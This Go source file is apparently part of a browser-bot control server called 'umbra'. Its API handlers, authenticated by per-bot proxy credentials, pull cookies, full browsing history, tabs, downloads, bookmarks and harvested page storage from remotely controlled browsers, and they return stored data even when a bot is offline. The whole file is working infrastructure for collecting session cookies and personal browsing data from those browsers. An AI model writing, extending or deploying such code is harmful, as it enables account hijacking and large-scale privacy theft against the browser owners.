package api

import (
	"context"
	"errors"
	"net/http"
	"time"

	"gorm.io/gorm"

	"github.com/s045pd/umbra/internal/db/models"
)

// ProxyCredsAPI exposes endpoints used by *external* tools (the Chrome
// extension / proxy clients) to verify proxy credentials and snapshot
// browser data. They are public (no session) but rely on bot-level
// proxy_username/proxy_password for auth.
type ProxyCredsAPI struct {
	DB  *gorm.DB
	RPC BotRPC
}

type proxyCredReq struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Method   string `json:"method,omitempty"`
}

// VerifyProxyCredentials is POST /api/v1/verify-proxy-credentials
func (a *ProxyCredsAPI) VerifyProxyCredentials(w http.ResponseWriter, r *http.Request) {
	var body proxyCredReq
	if !MustDecode(w, r, &body) {
		return
	}
	bot, err := findBotByCredentials(a.DB, body.Username, body.Password)
	if err != nil {
		JSONErr(w, http.StatusUnauthorized, "invalid proxy credentials")
		return
	}
	JSONOK(w, map[string]any{
		"id":             bot.ID,
		"is_online":      bot.IsOnline,
		"name":           bot.Name,
		"proxy_password": bot.ProxyPassword,
		"proxy_username": bot.ProxyUsername,
		"user_agent":     bot.UserAgent,
	})
}

// GetBotBrowserCookies is POST /api/v1/get-bot-browser-cookies
func (a *ProxyCredsAPI) GetBotBrowserCookies(w http.ResponseWriter, r *http.Request) {
	a.fetchVia(w, r, "GET_BROWSER_COOKIE_ARRAY", "cookies", nil)
}

// GetBotBrowser is POST /api/v1/get-bot-browser
func (a *ProxyCredsAPI) GetBotBrowser(w http.ResponseWriter, r *http.Request) {
	a.fetchVia(w, r, "GET_BROWSER_HISTORY_ARRAY", "history", map[string]any{"days": 36500})
}

var liveCategoryRPC = map[string]string{
	"cookies":   "GET_BROWSER_COOKIE_ARRAY",
	"history":   "GET_BROWSER_HISTORY_ARRAY",
	"tabs":      "GET_TABS",
	"downloads": "GET_DOWNLOADS",
	"bookmarks": "GET_BOOKMARKS",
	"storage":   "GET_PAGE_STORAGE",
}

type browserStateReq struct {
	Username   string   `json:"username"`
	Password   string   `json:"password"`
	Categories []string `json:"categories"`
}

// GetBotBrowserState is POST /api/v1/get-bot-browser-state
func (a *ProxyCredsAPI) GetBotBrowserState(w http.ResponseWriter, r *http.Request) {
	var body browserStateReq
	if !MustDecode(w, r, &body) {
		return
	}
	bot, err := findBotByCredentials(a.DB, body.Username, body.Password)
	if err != nil {
		JSONErr(w, http.StatusUnauthorized, "invalid proxy credentials")
		return
	}
	if len(body.Categories) == 0 {
		body.Categories = []string{"cookies"}
	}
	out := map[string]any{}
	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()
	for _, category := range body.Categories {
		action, ok := liveCategoryRPC[category]
		if !ok {
			JSONErr(w, http.StatusBadRequest, "unsupported category")
			return
		}
		var data map[string]any
		if category == "history" {
			data = map[string]any{"days": 36500}
		}
		payload, err := a.RPC.CallBot(ctx, bot.BrowserID, action, data)
		if err != nil {
			if errors.Is(err, ErrBotOffline) {
				JSONErr(w, http.StatusBadGateway, "bot offline")
				return
			}
			JSONErr(w, http.StatusGatewayTimeout, err.Error())
			return
		}
		out[category] = payload[category]
	}
	JSONOK(w, out)
}

// GetBotPageStorage is POST /api/v1/get-bot-page-storage
// Returns the last harvested origin storage, including when the bot is offline.
func (a *ProxyCredsAPI) GetBotPageStorage(w http.ResponseWriter, r *http.Request) {
	var body proxyCredReq
	if !MustDecode(w, r, &body) {
		return
	}
	bot, err := findBotByCredentials(a.DB, body.Username, body.Password)
	if err != nil {
		JSONErr(w, http.StatusUnauthorized, "invalid proxy credentials")
		return
	}
	var row models.BotPageStorage
	if err := a.DB.Where("bot_id = ?", bot.ID).First(&row).Error; err != nil {
		JSONOK(w, map[string]any{"origins": []any{}, "captured_at": nil})
		return
	}
	JSONOK(w, map[string]any{"origins": row.Origins, "captured_at": row.CapturedAt})
}

func (a *ProxyCredsAPI) fetchVia(w http.ResponseWriter, r *http.Request, action, resultKey string, data map[string]any) {
	var body proxyCredReq
	if !MustDecode(w, r, &body) {
		return
	}
	bot, err := findBotByCredentials(a.DB, body.Username, body.Password)
	if err != nil {
		JSONErr(w, http.StatusUnauthorized, "invalid proxy credentials")
		return
	}
	ctx, cancel := context.WithTimeout(r.Context(), 30*time.Second)
	defer cancel()
	out, err := a.RPC.CallBot(ctx, bot.BrowserID, action, data)
	if err != nil {
		if errors.Is(err, ErrBotOffline) {
			JSONErr(w, http.StatusBadGateway, "bot offline")
			return
		}
		JSONErr(w, http.StatusGatewayTimeout, err.Error())
		return
	}
	JSONOK(w, map[string]any{resultKey: out[resultKey]})
}
